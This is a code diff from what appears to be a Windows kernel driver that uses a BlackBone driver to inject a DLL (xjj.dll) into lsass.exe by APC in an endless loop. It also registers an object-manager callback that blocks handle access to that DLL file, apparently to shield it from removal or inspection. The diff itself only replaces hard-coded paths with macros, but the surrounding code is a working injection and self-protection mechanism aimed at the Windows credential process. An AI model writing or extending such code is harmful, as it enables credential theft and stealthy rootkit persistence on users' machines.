@@ -8,8 +8,9 @@
 #define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
 #define TARGET_PNAME_1 "lsass.exe"
 #define TARGET_PNAME_2 "explorer.exe"
-#define TARGET_SYS "C:\\Users\\Administrator\\Desktop\\BlackBoneDrv.sys"
-#define TARGET_DLL "C:\\Users\\Administrator\\Desktop\\XJJ.dll"
+#define TARGET_SYS L"C:\\Users\\Administrator\\Desktop\\BlackBoneDrv.sys"
+#define TARGET_DLL_FOR_INJECT L"C:\\Users\\Administrator\\Desktop\\xjj.dll"
+#define TARGET_DLL_FOR_HOOK L"xjj.dll"
 #define INJECT_SPLIT (60)
 #define INVALID_PID (-1)
 KEVENT kEvent;
@@ -191,7 +192,7 @@ VOID MyThreadFunc(IN PVOID context)
 	INJECT_DLL data = { IT_Thread };
 
 	for (; ; ) {
-		wcscpy_s(data.FullDllPath, 512, L"C:\\XJJ.dll");
+		wcscpy_s(data.FullDllPath, 512, TARGET_DLL_FOR_INJECT );
 		wcscpy_s(data.initArg, 512, L"");
 		data.type = IT_Apc;
 		data.pid = GetPidByPName(TARGET_PNAME_1);
@@ -234,7 +235,7 @@ OB_PREOP_CALLBACK_STATUS preCall(PVOID RegistrationContext, POB_PRE_OPERATION_IN
 		!_wcsicmp(fileo->FileName.Buffer, L"\\"))
 		return OB_PREOP_SUCCESS;
 	//×èÖ¹·ÃÎÊreadme.txt
-	if (wcsstr(_wcslwr(fileo->FileName.Buffer), L"xjj.dll"))
+	if (wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_DLL_FOR_HOOK))
 	{
 		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
 		{
